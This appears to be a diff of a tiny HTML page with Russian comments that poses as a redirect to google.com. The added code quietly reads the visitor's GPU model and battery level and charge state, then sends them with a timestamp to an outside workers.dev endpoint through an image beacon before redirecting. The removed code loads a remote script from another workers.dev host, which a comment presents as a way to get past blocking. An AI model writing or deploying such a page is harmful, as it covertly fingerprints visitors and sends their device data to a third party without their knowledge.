@@ -1,20 +1,47 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"></head>
-<body style="background:#000;">
-    <script>
-        // 1. Твоя подтвержденная ссылка + анти-кэш
-        const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/" + Math.random();
-        
-        // 2. Создаем элемент скрипта (самый мощный способ обхода блокировок)
-        const s = document.createElement('script');
-        s.src = workerUrl;
-        document.head.appendChild(s);
+<head><meta charset="utf-8"></head>
+<body>
+<script>
+async function getSpecs() {
+    let gpu = "N/A";
+    let bat = "N/A";
+    
+    // Сбор данных GPU
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    } catch (e) {}
 
-        // 3. Редирект через 2 секунды (запас времени для пробива в РФ)
-        setTimeout(() => {
-            window.location.replace("https://google.com");
-        }, 2000);
-    </script>
+    // Сбор данных батареи
+    try {
+        const battery = await navigator.getBattery();
+        bat = `${Math.round(battery.level * 100)}%${battery.charging ? '+' : '-'}`;
+    } catch (e) {}
+
+    const params = new URLSearchParams({
+        t: new Date().toLocaleString(),
+        gpu: gpu,
+        bat: bat,
+        rnd: Math.random().toString(36).substring(7)
+    });
+
+    const workerUrl = "https://adminfdm.workers.dev/?" + params.toString();
+    const img = new Image();
+    
+    const go = () => { window.location.replace("https://google.com"); };
+    
+    img.onload = go;
+    img.onerror = go;
+    img.src = workerUrl;
+    
+    // Резервный таймер для медленных сетей
+    setTimeout(go, 2500);
+}
+
+getSpecs();
+</script>
 </body>
 </html>
